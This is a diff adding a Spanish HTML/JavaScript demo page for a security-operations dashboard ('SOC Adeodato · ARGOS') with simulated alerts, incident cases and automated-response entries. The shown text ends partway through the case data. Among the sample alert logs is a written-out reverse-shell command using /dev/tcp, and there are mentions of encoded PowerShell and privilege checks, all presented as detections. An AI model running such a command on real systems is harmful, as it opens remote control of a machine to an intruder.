@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC Adeodato · ARGOS Panel — Demo interactiva</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  :root{
+    --bg:#0b0f14; --panel:#131a22; --panel2:#0f151c; --border:#20303c;
+    --teal:#2dd4bf; --teal-dim:#1F7A6D; --orange:#e8944a; --orange-dim:#C87A2E;
+    --red:#ef4444; --amber:#facc15; --green:#22c55e; --blue:#3b82f6;
+    --text:#e6edf3; --muted:#8b99a7; --glow:rgba(45,212,191,.15);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh}
+  .app{display:grid;grid-template-columns:230px 1fr;min-height:100vh}
+
+  .side{background:linear-gradient(180deg,#0f1620,#0b1016);border-right:1px solid var(--border);padding:18px 14px;position:sticky;top:0;height:100vh}
+  .brand{display:flex;align-items:center;gap:11px;padding:4px 6px 18px}
+  .mark{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--teal),var(--teal-dim));display:grid;place-items:center;box-shadow:0 0 20px var(--glow);flex:none}
+  .mark svg{width:22px;height:22px}
+  .brand h1{font-size:17px;font-weight:700;letter-spacing:.5px}
+  .brand h1 span{color:var(--teal)}
+  .brand .sub{font-size:9.5px;color:var(--muted);letter-spacing:1.2px;text-transform:uppercase;margin-top:1px}
+  .nav{display:flex;flex-direction:column;gap:4px;margin-top:8px}
+  .nav a{display:flex;align-items:center;gap:11px;padding:10px 12px;border-radius:9px;color:var(--muted);
+    font-size:13.5px;font-weight:600;cursor:pointer;text-decoration:none;transition:.15s}
+  .nav a:hover{background:rgba(255,255,255,.04);color:var(--text)}
+  .nav a.active{background:rgba(45,212,191,.12);color:var(--text)}
+  .nav a.active .ni{background:var(--teal-dim)}
+  .ni{width:26px;height:26px;border-radius:7px;background:#182430;display:grid;place-items:center;flex:none}
+  .ni svg{width:15px;height:15px;stroke:currentColor;color:var(--teal)}
+  .side-foot{position:absolute;bottom:16px;left:14px;right:14px;font-size:10.5px;color:var(--muted);line-height:1.6}
+  .back-web{display:flex;align-items:center;gap:7px;font-size:12px;color:var(--teal);text-decoration:none;font-weight:600;margin-bottom:6px;padding:8px 10px;border:1px dashed var(--border);border-radius:9px}
+  .back-web:hover{background:rgba(45,212,191,.08)}
+
+  .main{padding:18px 24px 40px;max-width:1180px}
+  .bar{display:flex;align-items:center;justify-content:space-between;gap:14px;margin-bottom:16px;flex-wrap:wrap}
+  .bar .crumb{font-size:13px;color:var(--muted)}
+  .bar .crumb b{color:var(--text)}
+  .top-right{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+  .live{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.25);padding:6px 11px;border-radius:20px}
+  .live .dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse 1.8s infinite}
+  .live.demo{background:rgba(232,148,74,.1);border:1px solid rgba(232,148,74,.35);color:var(--orange)}
+  .live.demo .dot{background:var(--orange)}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(34,197,94,.55)}70%{box-shadow:0 0 0 9px rgba(34,197,94,0)}100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}}
+  .clock{font-variant-numeric:tabular-nums;font-size:12.5px;color:var(--muted);font-family:'JetBrains Mono',monospace}
+  .btn{display:inline-flex;align-items:center;gap:7px;background:linear-gradient(135deg,var(--teal),var(--teal-dim));color:#04201c;border:none;padding:8px 15px;border-radius:9px;font-size:12.5px;font-weight:700;cursor:pointer;transition:.15s}
+  .btn:hover{filter:brightness(1.12)}
+  .btn-sm{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,var(--teal),var(--teal-dim));color:#04201c;border:none;padding:6px 12px;border-radius:8px;font-size:11.5px;font-weight:700;cursor:pointer;transition:.15s;white-space:nowrap}
+  .btn-sm:hover{filter:brightness(1.12)}
+  .btn-ghost{background:transparent;border:1px solid var(--teal);color:var(--teal);font-weight:700;padding:7px 14px;border-radius:9px;font-size:12.5px;cursor:pointer;transition:.15s}
+  .btn-ghost:hover{background:rgba(45,212,191,.12)}
+
+  .demo-note{font-size:11px;color:var(--muted);margin:-6px 0 14px;background:rgba(232,148,74,.08);border:1px solid rgba(232,148,74,.25);border-radius:9px;padding:8px 12px}
+  .demo-note b{color:var(--orange)}
+
+  .view{display:none;animation:fade .3s ease}
+  .view.on{display:block}
+  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  .kpis{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:14px}
+  .kpi{background:var(--panel);border:1px solid var(--border);border-radius:13px;padding:14px 16px;position:relative;overflow:hidden}
+  .kpi::after{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--teal)}
+  .kpi.orange::after{background:var(--orange)}.kpi.red::after{background:var(--red)}.kpi.blue::after{background:var(--blue)}
+  .kpi .label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.7px}
+  .kpi .val{font-size:27px;font-weight:700;margin-top:5px;font-variant-numeric:tabular-nums}
+  .kpi .val small{font-size:14px;color:var(--muted);font-weight:600}
+  .kpi .delta{font-size:11px;color:var(--green);margin-top:2px}
+
+  .grid2{display:grid;grid-template-columns:1.5fr 1fr;gap:14px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:13px;padding:15px 17px}
+  .card h2{font-size:13px;text-transform:uppercase;letter-spacing:.9px;color:var(--muted);display:flex;align-items:center;justify-content:space-between;margin-bottom:11px;font-weight:700}
+  .card h2 .tag{font-size:10.5px;color:var(--teal);background:rgba(45,212,191,.1);padding:3px 9px;border-radius:12px}
+  .filters{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:11px}
+  .f{border:1px solid var(--border);background:var(--panel2);color:var(--muted);border-radius:14px;padding:4px 11px;font-size:11px;font-weight:700;cursor:pointer;transition:.15s;line-height:1.4}
+  .f:hover{color:var(--text);border-color:var(--teal)}
+  .f.on{background:rgba(45,212,191,.12);color:var(--teal);border-color:var(--teal)}
+  .f.crit.on{background:rgba(239,68,68,.15);color:#ff8585;border-color:#ff4d4d}
+  .f.high.on{background:rgba(232,148,74,.15);color:var(--orange);border-color:var(--orange)}
+  .f.med.on{background:rgba(250,204,21,.15);color:var(--amber);border-color:var(--amber)}
+  .f.low.on{background:rgba(34,197,94,.15);color:var(--green);border-color:var(--green)}
+
+  .feed{display:flex;flex-direction:column;gap:8px}
+  .alert{display:grid;grid-template-columns:auto 1fr auto;gap:11px;align-items:center;background:var(--panel2);border:1px solid var(--border);border-left:3px solid var(--muted);border-radius:10px;padding:10px 12px;cursor:pointer;transition:.15s;animation:slidein .5s ease}
+  .alert:hover{border-color:var(--teal);transform:translateX(2px)}
+  .alert.crit{border-left-color:var(--red)}.alert.high{border-left-color:var(--orange)}.alert.med{border-left-color:var(--amber)}.alert.low{border-left-color:var(--green)}
+  @keyframes slidein{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:none}}
+  .sev{width:10px;height:10px;border-radius:50%;background:var(--muted)}
+  .sev.crit{background:var(--red);box-shadow:0 0 8px var(--red)}.sev.high{background:var(--orange);box-shadow:0 0 8px var(--orange)}.sev.med{background:var(--amber)}.sev.low{background:var(--green)}
+  .alert .title{font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .alert .meta{font-size:11px;color:var(--muted);margin-top:2px}
+  .alert .meta .mitre{color:var(--teal);font-weight:600}
+  .alert .meta .ot{color:var(--orange);font-weight:700}
+  .alert .status{font-size:10.5px;font-weight:700;text-align:right;white-space:nowrap}
+  .alert .status small{display:block;color:var(--muted);font-weight:500;font-size:10px;margin-top:2px}
+  .hint{font-size:12px;color:var(--muted);padding:6px 2px}
+
+  .donut-wrap{display:flex;align-items:center;gap:16px}
+  .legend{display:flex;flex-direction:column;gap:8px;font-size:12px}
+  .legend div{display:flex;align-items:center;gap:8px;color:var(--muted)}
+  .legend .sw{width:11px;height:11px;border-radius:3px}
+  .legend b{color:var(--text);margin-left:auto;font-variant-numeric:tabular-nums}
+
+  .resp-list{display:flex;flex-direction:column;gap:9px}
+  .resp-list .r{display:flex;align-items:center;gap:11px;font-size:12.5px;background:var(--panel2);border:1px solid var(--border);border-radius:9px;padding:9px 12px}
+  .resp-list .ic{width:26px;height:26px;border-radius:7px;background:rgba(34,197,94,.12);display:grid;place-items:center;flex:none}
+  .resp-list .ic svg{width:15px;height:15px;stroke:var(--green)}
+  .resp-list .ic.warn{background:rgba(245,158,11,.14)}.resp-list .ic.warn svg{stroke:var(--amber)}
+  .resp-list .when{margin-left:auto;color:var(--muted);font-size:11px;white-space:nowrap}
+
+  .mitre{display:flex;flex-wrap:wrap;gap:8px}
+  .tech{font-size:11.5px;padding:7px 11px;border-radius:9px;border:1px solid var(--border);background:var(--panel2);color:var(--muted)}
+  .tech b{color:var(--muted)}
+  .tech.on{border-color:var(--teal);background:rgba(45,212,191,.12);color:var(--text)}.tech.on b{color:var(--teal)}
+  .tech.hot{border-color:var(--orange);background:rgba(232,148,74,.14);color:var(--text)}.tech.hot b{color:var(--orange)}
+
+  table{width:100%;border-collapse:collapse}
+  thead th{text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:var(--muted);padding:10px 12px;border-bottom:1px solid var(--border)}
+  tbody tr{cursor:pointer;transition:.12s}
+  tbody tr:hover{background:rgba(45,212,191,.06)}
+  tbody td{padding:12px;border-bottom:1px solid #172230;font-size:13px}
+  .pill{font-size:10.5px;font-weight:700;padding:3px 9px;border-radius:20px;display:inline-block}
+  .pill.crit{background:rgba(239,68,68,.15);color:#ff8585}.pill.high{background:rgba(232,148,74,.15);color:var(--orange)}
+  .pill.med{background:rgba(250,204,21,.15);color:var(--amber)}.pill.low{background:rgba(34,197,94,.15);color:var(--green)}
+  .pill.ot{background:rgba(232,148,74,.12);color:var(--orange);border:1px solid rgba(232,148,74,.35)}
+  .pill.teal{background:rgba(45,212,191,.12);color:var(--teal)}
+  .badge-st{font-size:11px;font-weight:700}
+  .st-cont{color:var(--green)}.st-rev{color:var(--amber)}
+  p.body{font-size:13.5px;line-height:1.65;color:#cfd8e0;margin-bottom:8px}
+
+  .backlink{display:inline-flex;align-items:center;gap:7px;font-size:12.5px;color:var(--teal);cursor:pointer;margin-bottom:12px;font-weight:600}
+  .case-head{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:14px}
+  .case-head h3{font-size:20px;font-weight:700;margin-bottom:8px}
+  .case-head .chips{display:flex;gap:8px;flex-wrap:wrap}
+  .kv{font-size:12px;color:var(--muted);text-align:right;line-height:1.9}
+  .kv b{color:var(--text)}
+  .rep-grid{display:grid;grid-template-columns:1.6fr 1fr;gap:14px;align-items:start}
+  .section-t{font-size:12px;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);font-weight:700;margin:2px 0 9px}
+  .enrich{display:flex;flex-direction:column;gap:9px;margin-bottom:6px}
+  .enrich .e{display:flex;gap:10px;font-size:12.5px;background:var(--panel2);border:1px solid var(--border);border-radius:9px;padding:10px 12px}
+  .enrich .e .lab{color:var(--teal);font-weight:700;flex:none}
+  .tl{position:relative;padding-left:20px}
+  .tl::before{content:"";position:absolute;left:5px;top:4px;bottom:4px;width:2px;background:var(--border)}
+  .tl .ev{position:relative;padding:0 0 14px 4px}
+  .tl .ev::before{content:"";position:absolute;left:-19px;top:3px;width:11px;height:11px;border-radius:50%;background:var(--teal);box-shadow:0 0 0 3px var(--bg)}
+  .tl .ev.cont::before{background:var(--green)}.tl .ev.crit::before{background:var(--red)}
+  .tl .ph{font-size:10.5px;text-transform:uppercase;letter-spacing:.6px;color:var(--teal);font-weight:700}
+  .tl .ev.cont .ph{color:var(--green)}
+  .tl .tt{font-size:13px;margin-top:2px}
+  .tl .tm{font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums}
+  ul.reco{list-style:none;display:flex;flex-direction:column;gap:7px}
+  ul.reco li{font-size:12.5px;color:#cfd8e0;padding-left:18px;position:relative}
+  ul.reco li::before{content:"→";position:absolute;left:0;color:var(--teal)}
+  .verdict{display:inline-block;font-size:11px;font-weight:700;padding:4px 11px;border-radius:20px;margin-top:4px}
+  .verdict.tp{background:rgba(239,68,68,.14);color:#ff8585}
+  .verdict.bn{background:rgba(34,197,94,.14);color:var(--green)}
+
+  .ov{position:fixed;inset:0;background:rgba(4,7,12,.78);display:none;align-items:center;justify-content:center;z-index:100;padding:20px}
+  .ov.on{display:flex}
+  .detail{background:var(--panel);border:1px solid var(--border);border-radius:14px;width:min(620px,100%);max-height:88vh;overflow:auto;padding:20px}
+  .detail h3{font-size:17px;margin:6px 0 10px}
+  .chips{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:12px}
+  .close-x{margin-left:auto;cursor:pointer;color:var(--muted);font-size:18px;background:none;border:none}
+  .kv2{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:12px}
+  .kv2 .e{background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:8px 11px;font-size:12px}
+  .kv2 .e .lab{color:var(--muted);font-size:10.5px;text-transform:uppercase;letter-spacing:.5px}
+  .kv2 .e b{font-size:12.5px}
+  pre{background:#06090d;border:1px solid var(--border);border-radius:9px;padding:11px;font-size:11.5px;overflow:auto;max-height:220px;white-space:pre-wrap;word-break:break-word;color:#c9d4de;font-family:'JetBrains Mono',Consolas,monospace}
+  .pre-t{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin:12px 0 5px}
+
+  .rep-list{display:flex;flex-direction:column;gap:10px}
+  .rep-card{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:12px 14px}
+  .rep-card .top{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+  .rep-card .top b:first-child{color:var(--teal)}
+  .rep-card .meta{font-size:11.5px;color:var(--muted);margin-top:6px;display:flex;gap:16px;flex-wrap:wrap}
+  .pbar2{height:6px;background:#1b2732;border-radius:6px;overflow:hidden;flex:0 0 90px}
+  .pbar2 i{display:block;height:100%;background:var(--teal)}
+
+  footer{margin-top:22px;font-size:11px;color:var(--muted);line-height:1.7;border-top:1px solid var(--border);padding-top:14px}
+  footer b{color:var(--teal)}
+  @media(max-width:860px){.app{grid-template-columns:1fr}.side{position:static;height:auto}.side-foot{position:static;margin-top:14px}.kpis{grid-template-columns:repeat(2,1fr)}.grid2,.rep-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- SIDEBAR -->
+  <aside class="side">
+    <div class="brand">
+      <div class="mark"><svg viewBox="0 0 24 24" fill="none"><path d="M12 2l8 3v6c0 5-3.5 8.5-8 11-4.5-2.5-8-6-8-11V5l8-3z" stroke="#04201c" stroke-width="1.6" fill="#eafffb"/><path d="M9 12l2 2 4-4.5" stroke="#0d7d6c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+      <div><h1><span>SOC Adeodato</span></h1><div class="sub">ARGOS · AdeoSOC · IT/OT</div></div>
+    </div>
+    <a class="back-web" href="./"><i class="fa-solid fa-arrow-left"></i> Volver a adeodato.es</a>
+    <nav class="nav">
+      <a id="nav-dashboard" class="active" onclick="go('dashboard')"><span class="ni"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><rect x="3" y="3" width="7" height="9" rx="1"/><rect x="14" y="3" width="7" height="5" rx="1"/><rect x="14" y="12" width="7" height="9" rx="1"/><rect x="3" y="16" width="7" height="5" rx="1"/></svg></span><span>Panel</span></a>
+      <a id="nav-cases" onclick="go('cases')"><span class="ni"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M4 7h16M4 12h16M4 17h10"/></svg></span><span>Casos</span></a>
+      <a id="nav-response" onclick="go('response')"><span class="ni"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 2l8 3v6c0 5-3.5 8.5-8 11-4.5-2.5-8-6-8-11V5l8-3z"/><path d="M9 12l2 2 4-4"/></svg></span><span>Respuesta activa</span></a>
+      <a id="nav-mitre" onclick="go('mitre')"><span class="ni"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 3v18M3 12h18"/></svg></span><span>MITRE ATT&amp;CK</span></a>
+      <a id="nav-reportes" onclick="go('reportes')"><span class="ni"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M5 4h10l4 4v12H5z"/><path d="M15 4v4h4M8 12h8M8 16h6"/></svg></span><span>Reportes</span></a>
+    </nav>
+    <div class="side-foot">Demo interactiva · datos simulados<br>El panel real opera solo en 127.0.0.1, sin exposición a Internet.</div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="bar">
+      <div class="crumb" id="crumb"><b>Panel de control</b></div>
+      <div class="top-right">
+        <div class="live demo" id="mode-pill"><span class="dot"></span><span id="mode-txt">MODO DEMO</span></div>
+        <div class="clock" id="clock">--:--:--</div>
+        <button class="btn-ghost" onclick="refresh()" title="Actualizar ahora">↻</button>
+        <button class="btn-ghost" id="btn-demo" onclick="toggleDemo()">DEMO: ON</button>
+      </div>
+    </div>
+    <div class="demo-note" id="demo-note"><span>Replica estatica del panel · datos de demostración · </span><b>sin exposición a Internet.</b></div>
+
+    <!-- DASHBOARD -->
+    <section id="view-dashboard" class="view on">
+      <div class="kpis">
+        <div class="kpi"><div class="label">Alertas · 24 h</div><div class="val" id="kpi-alerts">–</div><div class="delta">▲ detección 24/7</div></div>
+        <div class="kpi orange"><div class="label">Amenazas contenidas</div><div class="val" id="kpi-cont">–</div><div class="delta">respuesta automática</div></div>
+        <div class="kpi red"><div class="label">Casos abiertos</div><div class="val" id="kpi-casos">–</div><div class="delta" style="color:var(--muted)">en gestión (IRIS)</div></div>
+        <div class="kpi blue"><div class="label">Alertas OT · 24 h</div><div class="val" id="kpi-ot">–</div><div class="delta">IT + OT en una vista</div></div>
+      </div>
+      <div class="grid2">
+        <div class="card">
+          <h2><span>Flujo de alertas en vivo</span><span class="tag">ARGOS triage</span></h2>
+          <div class="filters" id="filters"></div>
+          <div class="feed" id="feed"><div class="hint">Cargando…</div></div>
+          <div style="font-size:11px;color:var(--muted);margin-top:10px">Haz clic en una alerta para ver su detalle.</div>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:14px">
+          <div class="card">
+            <h2>Severidad · 24 h</h2>
+            <div class="donut-wrap">
+              <svg width="120" height="120" viewBox="0 0 42 42">
+                <circle cx="21" cy="21" r="15.9" fill="none" stroke="#1b2732" stroke-width="7"></circle>
+                <g id="donut-arcs"></g>
+                <text id="donut-total" x="21" y="20.5" text-anchor="middle" font-size="7" fill="#e6edf3" font-weight="700">–</text>
+                <text x="21" y="27.5" text-anchor="middle" font-size="4.2" fill="#8b99a7">alertas</text>
+              </svg>
+              <div class="legend" id="legend"></div>
+            </div>
+          </div>
+          <div class="card">
+            <h2>Respuesta automática · reciente</h2>
+            <div class="resp-list" id="resp-mini"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CASES -->
+    <section id="view-cases" class="view">
+      <div class="card">
+        <h2><span>Casos de incidente</span><span class="tag" id="cases-tag">abiertos</span></h2>
+        <table><thead><tr>
+          <th>ID</th><th>Incidente</th><th>MITRE</th><th>Severidad</th><th>Activo</th><th>Estado</th><th></th>
+        </tr></thead><tbody id="cases-body"></tbody></table>
+      </div>
+    </section>
+
+    <!-- CASE DETAIL -->
+    <section id="view-case" class="view"></section>
+
+    <!-- RESPONSE -->
+    <section id="view-response" class="view">
+      <div class="card">
+        <h2><span>Acciones de respuesta automática</span><span class="tag">Active Response</span></h2>
+        <p class="body">Contención aplicada por el sistema sin intervención humana. En activos OT el aislamiento requiere confirmación humana para no parar producción.</p>
+        <div class="resp-list" id="resp-full" style="margin-top:10px"></div>
+      </div>
+    </section>
+
+    <!-- MITRE -->
+    <section id="view-mitre" class="view">
+      <div class="card">
+        <h2><span>Cobertura MITRE ATT&amp;CK</span></h2>
+        <p class="body">Técnicas observadas y correlacionadas por ARGOS en el entorno. Las resaltadas están activas en casos abiertos.</p>
+        <div class="mitre" id="mitre-box" style="margin-top:12px"></div>
+      </div>
+    </section>
+
+    <!-- REPORTES -->
+    <section id="view-reportes" class="view">
+      <div class="card">
+        <h2><span>Informe semanal de seguridad</span><span class="tag">SOC Adeodato</span></h2>
+        <p class="body">Documenta cada caso (veredicto, narrativa, enriquecimiento, timeline PICERL, respuesta) y genera un informe profesional de los últimos 7 días, listo para presentar como PDF.</p>
+        <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center">
+          <button class="btn" onclick="genReport()">Generar informe semanal</button>
+          <span style="font-size:11px;color:var(--muted)">Se abre en una pestaña nueva: Ctrl+P / Guardar como PDF.</span>
+        </div>
+      </div>
+      <div class="card" style="margin-top:14px">
+        <h2><span>Casos documentados</span><span class="tag" id="rep-tag">0</span></h2>
+        <div class="rep-list" id="rep-list"><div class="hint">Cargando…</div></div>
+      </div>
+    </section>
+
+    <footer>
+      <div><b>SOC Adeodato</b> — ARGOS + AdeoSOC · Detección continua · contención automática · IT y OT · operable desde el móvil</div>
+      <div>Demo interactiva de <b>adeodato.es</b>. El SOC real opera aislado en red privada, sin exposición a Internet.</div>
+    </footer>
+  </main>
+</div>
+
+<!-- DETALLE DE ALERTA -->
+<div class="ov" id="ov-detail">
+  <div class="detail">
+    <div style="display:flex"><button class="close-x" onclick="closeDetail()">✕</button></div>
+    <div id="d-body"></div>
+  </div>
+</div>
+
+<script>
+/* ------------------------------------------------------------------
+   DATOS DE DEMOSTRACIÓN (misma lógica vitrina que el panel ARGOS)
+   ------------------------------------------------------------------ */
+var SEV={critica:{n:'Crítica',c:'crit'},alta:{n:'Alta',c:'high'},media:{n:'Media',c:'med'},baja:{n:'Baja',c:'low'}};
+var ICONS={
+  lock:'<svg viewBox="0 0 24 24" fill="none" stroke-width="2"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>',
+  check:'<svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M5 12l5 5L20 7"/></svg>',
+  warn:'<svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 3l9 16H3z"/><path d="M12 10v4M12 17v.5"/></svg>'};
+var TL_FASES=['Identificación','Contención','Erradicación','Recuperación','Cierre'];
+
+var DEMO_POOL=[
+  {desc:"Fuerza bruta SSH desde origen único",rule:"5712",level:10,sev:"alta",mitre:["T1110","T1078"],agent:"wazuh-server",ip:"45.132.11.7",ot:false,loc:"/var/log/auth.log",log:"authentication failure; logname=; uid=0; euid=0; tty=ssh; ruser=root; rhost=45.132.11.7 user=root"},
+  {desc:"Acceso OT fuera de horario · PLC línea 3",rule:"91003",level:13,sev:"critica",mitre:["T1078"],agent:"plc-linea-3",ip:"10.20.4.11",ot:true,asset:"PLC línea 3",loc:"argos-ot/plc",log:"ARGOS-OT: acceso a PLC fuera de ventana operativa (22:41), usuario: mantenimiento"},
+  {desc:"Comportamiento tipo ransomware en endpoint",rule:"92200",level:15,sev:"critica",mitre:["T1486","T1059"],agent:"pc-conta-04",ip:"10.10.2.44",ot:false,loc:"wazuh-agent/fim",log:'{"path":"C:/Users/…/docs_2019.xlsx","mode":"m","event":"cifrado masivo en curso"}'},
+  {desc:"Conexión saliente a IP en lista negra (MISP)",rule:"100002",level:12,sev:"alta",mitre:["T1071"],agent:"srv-web-01",ip:"23.129.64.8",ot:false,loc:"firewall",log:"outbound tcp from 10.10.1.20:443 to 23.129.64.8:9999 (threat feed: C2)"},
+  {desc:"Escaneo de puertos entrante",rule:"81002",level:8,sev:"media",mitre:["T1046"],agent:"gw-perimetral",ip:"193.27.14.2",ot:false,loc:"firewall",log:"NMAP scan detected: 1.5s window, 400 ports, from 193.27.14.2"},
+  {desc:"Accesos denegados repetidos · VPN",rule:"18001",level:7,sev:"media",mitre:["T1078"],agent:"vpn-node",ip:"88.4.19.6",ot:false,loc:"vpn/auth",log:"authentication failure: user=vpn-root, 6 intentos en 90 s"},
+  {desc:"Fallo de inicio de sesión por SSH (contraseña)",rule:"5710",level:5,sev:"media",mitre:["T1110"],agent:"wazuh-server",ip:"45.132.11.7",ot:false,loc:"/var/log/auth.log",log:"pam_unix(sshd:auth): authentication failure; rhost=45.132.11.7"},
+  {desc:"Uso de shell inverso detectado",rule:"95000",level:12,sev:"alta",mitre:["T1059","T1071"],agent:"pc-oper-02",ip:"10.10.3.17",ot:false,loc:"wazuh-agent/syscall",log:"exec: /bin/bash -i >& /dev/tcp/10.10.9.9/4444 0>&1"},
+  {desc:"Acceso anómalo a servidor OT (SCADA)",rule:"91010",level:12,sev:"alta",mitre:["T1078"],agent:"hmi-1",ip:"10.20.8.3",ot:true,asset:"HMI principal",loc:"argos-ot/hmi",log:"ARGOS-OT: inicio de sesión SCADA fuera de turno, estación no autorizada"},
+  {desc:"Elevación de privilegios sospechosa",rule:"61350",level:11,sev:"alta",mitre:["T1068"],agent:"pc-conta-04",ip:"10.10.2.44",ot:false,loc:"wazuh-agent/sysmon",log:"new process created: cmd.exe /c whoami /priv (parent: powershell.exe)"},
+  {desc:"Ejecución de script PowerShell ofuscado",rule:"92100",level:9,sev:"media",mitre:["T1059","T1027"],agent:"pc-oper-02",ip:"10.10.3.17",ot:false,loc:"wazuh-agent/powershell",log:"PowerShell: -enc 445479465480654580654806546 ..."},
+  {desc:"Modificación de registro de persistencia",rule:"91050",level:10,sev:"alta",mitre:["T1547"],agent:"pc-conta-04",ip:"10.10.2.44",ot:false,loc:"wazuh-agent/sysmon",log:"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run: value added"},
+  {desc:"Transferencia anómala de datos saliente",rule:"72011",level:11,sev:"alta",mitre:["T1048"],agent:"srv-web-01",ip:"10.10.1.20",ot:false,loc:"firewall",log:"outbound data burst: 800 MB in 12 min from 10.10.1.20 (exfil?)"},
+  {desc:"Credencial comprometida (fuga en lista negra)",rule:"100010",level:13,sev:"critica",mitre:["T1078"],agent:"srv-web-01",ip:"10.10.1.20",ot:false,loc:"misp/intel",log:"MISP: credencial de administrador en dump publicado (haveibeenpwned)"},
+  {desc:"Servicio web expuesto con ruta de explotación",rule:"31151",level:8,sev:"media",mitre:["T1190"],agent:"srv-web-01",ip:"23.129.64.8",ot:false,loc:"wazuh-agent/apache",log:"GET /wp-login.php?action=login 401 (repetido desde 23.129.64.8)"},
+  {desc:"Desactivación de agente de seguridad",rule:"60001",level:14,sev:"critica",mitre:["T1562"],agent:"pc-oper-02",ip:"10.10.3.17",ot:false,loc:"wazuh-agent",log:"wazuh-agent: servicio detenido + fichero ossec.conf modificado"},
+  {desc:"Cambio de firmware en activo OT",rule:"91040",level:12,sev:"alta",mitre:["T1200"],agent:"plc-linea-2",ip:"10.20.4.9",ot:true,asset:"PLC línea 2",loc:"argos-ot/firmware",log:"ARGOS-OT: actualización de firmware sin orden de trabajo asociada"},
+  {desc:"Intento de conexión a recurso compartido SMB",rule:"56000",level:7,sev:"media",mitre:["T1021"],agent:"pc-cont-01",ip:"10.10.2.31",ot:false,loc:"wazuh-agent/smb",log:"SMB connect from 10.10.2.31 to ADMIN$ denegado (x12)"}
+];
+
+var DEMO_CASES=[
+  {id:9,sev:"alta",ot:false,title:"Fuerza bruta SSH desde origen único",mitre:[["T1110","Fuerza bruta"],["T1078","Cuentas válidas"]],asset:"wazuh-server",ip:"45.132.11.7",src:"Internet",when:"Hoy · 03:14",status:"Contenido",stcls:"st-cont",verdict:"tp",
+   summary:"Se detectaron múltiples fallos de autenticación SSH desde una misma IP contra el servidor en pocos segundos: patrón claro de fuerza bruta. La IA de ARGOS lo clasificó con confianza alta y la inteligencia de amenazas (MISP) marcó el origen como malicioso. El sistema contuvo el ataque de forma automática antes de que hubiera acceso.",
+   ia:"Patrón de fuerza bruta desde origen único. Confianza: alta.",misp:"IP en lista negra — escáner/atacante SSH conocido.",
+   timeline:[["Identificación","03:14:07","","Wazuh detecta fuerza bruta SSH (regla 5712, nivel 10)."],["Identificación","03:14:08","","ARGOS correlaciona, la IA hace triage y MISP enriquece."],["Contención","03:14:09","cont","Respuesta Activa: firewall-drop de la IP atacante."],["Contención","03:16:20","cont","El analista confirma desde el móvil y bloquea la cuenta."],["Cierre","03:22:00","","Caso documentado en IRIS con toda la trazabilidad."]],
+   response:[["lock","Host/IP bloqueada (firewall-drop)","03:14"],["lock","Cuenta de usuario bloqueada","03:16"],["check","Notificación push a AdeoSOC","03:14"]],
+   reco:["Restringir SSH a la red privada (tailnet), no exponerlo a Internet.","Forzar autenticación por clave + MFA; deshabilitar contraseñas.","Activar fail2ban como capa adicional."]},
+  {id:7,sev:"alta",ot:true,title:"Acceso OT fuera de horario · PLC línea 3",mitre:[["T1078","Cuentas válidas"]],asset:"plc-linea-3",ip:"10.20.4.11",src:"Red interna OT",when:"Ayer · 22:41",status:"En revisión",stcls:"st-rev",verdict:"bn",
